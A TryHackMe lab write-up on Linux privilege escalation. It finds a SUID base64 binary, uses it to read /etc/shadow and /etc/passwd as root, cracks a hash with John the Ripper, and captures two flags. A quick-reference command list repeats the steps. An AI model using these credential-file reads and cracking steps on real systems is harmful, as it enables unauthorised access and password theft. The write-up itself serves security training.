# THM — Linux PrivEsc: SUID Base64 & Password Cracking

> **Platform:** TryHackMe  
> **Difficulty:** Easy/Medium  
> **OS:** Linux  
> **Tags:** `#thm` `#linux` `#suid` `#gtfobins` `#arbitrary-file-read` `#shadow` `#john` `#password-cracking` `#privesc`

---

## Kill Chain Summary

```
SSH Login (leonard) → SUID Enumeration → base64 SUID Abuse
→ /etc/shadow Read → Hash Cracking (john) → su missy → Flag 1
→ Path Guessing via Arbitrary File Read → Flag 2
```

---

## 1. Initial Access — SSH Login

Connecting to the target using provided credentials:

```bash
ssh leonard@<TARGET_IP>
# Password: Penny123
```

✅ Shell obtained as user `leonard`.

---

## 2. SUID Enumeration

Once on the machine, we search for binaries with the **SUID bit** set. A SUID binary runs with the privileges of its **owner** (typically root) regardless of who launches it — making any writable or abusable SUID binary a potential privilege escalation vector.

**Command:**

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

**Flag breakdown:**

| Flag | Purpose |
|------|---------|
| `-type f` | Files only |
| `-perm -04000` | Match any file with the SUID bit set |
| `-ls` | Display detailed listing (owner, permissions) |
| `2>/dev/null` | Suppress permission errors for unreadable directories |

**Finding:** `/usr/bin/base64` has the SUID bit set and is owned by root.

---

## 3. Exploitation — Arbitrary File Read via SUID base64

Checking **GTFOBins** (`https://gtfobins.github.io/gtfobins/base64/`) confirms that `base64` with SUID enabled allows reading any file on the system — the process runs as root, bypassing standard file permission checks entirely.

**Technique:**

```bash
base64 /path/to/file | base64 --decode
```

The file is encoded to base64 (by the SUID-elevated process) and then decoded locally, producing the original file content in plaintext.

> ⚠️ **Important limitation:** This vulnerability grants **Arbitrary File Read**, not **Remote Code Execution**. We can read the content of any file if we know its exact path, but we cannot list directory contents (`ls`) with elevated privileges. Path knowledge (or guessing) is required.

---

## 4. Horizontal Escalation — /etc/shadow & Hash Cracking

### Step 1 — Read /etc/shadow

```bash
base64 /etc/shadow | base64 --decode
```

The `/etc/shadow` file contains hashed passwords for all system users. It is readable only by root under normal circumstances. The SUID base64 binary runs as root, bypassing this restriction.

Target hash identified: **missy**

### Step 2 — Save the hash (attacker machine)

Copy the full hash line for `missy` from the output and save it locally:

```bash
echo 'missy:<hash_string>' > hashmissy.txt
```

### Step 3 — Crack with John the Ripper

```bash
john hashmissy.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> 💡 To also provide the `/etc/passwd` file for proper unshadowing before cracking:
> ```bash
> base64 /etc/passwd | base64 --decode > passwd.txt
> unshadow passwd.txt shadow.txt > combined.txt
> john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
> ```

✅ Password cracked: `Password1`

---

## 5. Flag 1 — Horizontal Pivot to missy

```bash
su missy
# Password: Password1
```

```bash
cat ~/Documents/flag1.txt
```

✅ **Flag 1 captured.**

---

## 6. Flag 2 — Vertical Escalation via Path Guessing

With the SUID base64 technique still available, we attempt to read files outside our privilege scope. Directory listing is not possible with this technique (no `ls` escalation), so the full path must be known or inferred.

During enumeration, a reference to a `rootflag` path was observed. Testing the likely location:

```bash
base64 /home/rootflag/flag2.txt | base64 --decode
```

✅ **Flag 2 captured.**

> 🧠 **Technique note — Path Guessing:** When an Arbitrary File Read vulnerability is available without RCE, the attack surface is defined by your knowledge of the target filesystem layout. Common paths to try:
> - `/root/flag.txt` / `/root/root.txt`
> - `/home/<user>/flag.txt`
> - `/var/flag.txt`
> - Any path hinted at by application output, logs, or previous enumeration

---

## 7. Vulnerability Summary

| # | Finding | Severity | Detail |
|---|---------|----------|--------|
| 1 | SUID bit on `/usr/bin/base64` | 🔴 Critical | Allows arbitrary file read as root — `/etc/shadow`, config files, flags |
| 2 | `/etc/shadow` readable via SUID abuse | 🔴 Critical | All user password hashes exposed, enabling offline cracking |
| 3 | Weak password for `missy` | 🔴 High | `Password1` found in rockyou.txt — trivially cracked |
| 4 | No directory listing restriction bypass | ℹ️ Info | SUID file read does not grant `ls` — limits enumeration but does not prevent targeted reads |

---

## 8. Key Takeaways

- **GTFOBins is essential:** Any SUID binary found during enumeration should be immediately checked on GTFOBins. Common utilities like `base64`, `cp`, `find`, `less`, `vim`, `python` can all become root-level file read or shell execution vectors when SUID is set.
- **Arbitrary File Read ≠ RCE:** This distinction matters. With file read you can exfiltrate `/etc/shadow`, private SSH keys, application configs, and flags — but you cannot execute commands, spawn shells, or list directories as root. Understanding the precise capability boundary determines your next move.
- **`/etc/shadow` is the crown jewel of Linux enumeration:** Accessing it means obtaining every user's password hash. Combined with a wordlist attack, this often yields plaintext credentials for multiple accounts.
- **Path guessing is a real technique:** In blind file read scenarios, systematic path inference based on observed hints, common conventions (`/root/`, `/home/<user>/`), and enumeration output narrows the target surface quickly.
- **SUID enumeration is non-optional:** `find / -perm -04000 -ls 2>/dev/null` should be part of every Linux post-exploitation checklist, immediately after landing on a machine.

---

## Quick Reference — Key Commands

```bash
# Initial access
ssh leonard@<TARGET_IP>
# Password: Penny123

# SUID enumeration
find / -type f -perm -04000 -ls 2>/dev/null

# Arbitrary file read via SUID base64
base64 /etc/shadow | base64 --decode
base64 /etc/passwd | base64 --decode

# Proper unshadow + crack
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Horizontal pivot
su missy
# Password: Password1

# Flag 1
cat ~/Documents/flag1.txt

# Flag 2 (path guessing)
base64 /home/rootflag/flag2.txt | base64 --decode
```

---

*Writeup completed on 30/03/2026 — TryHackMe / Linux PrivEsc: SUID base64*
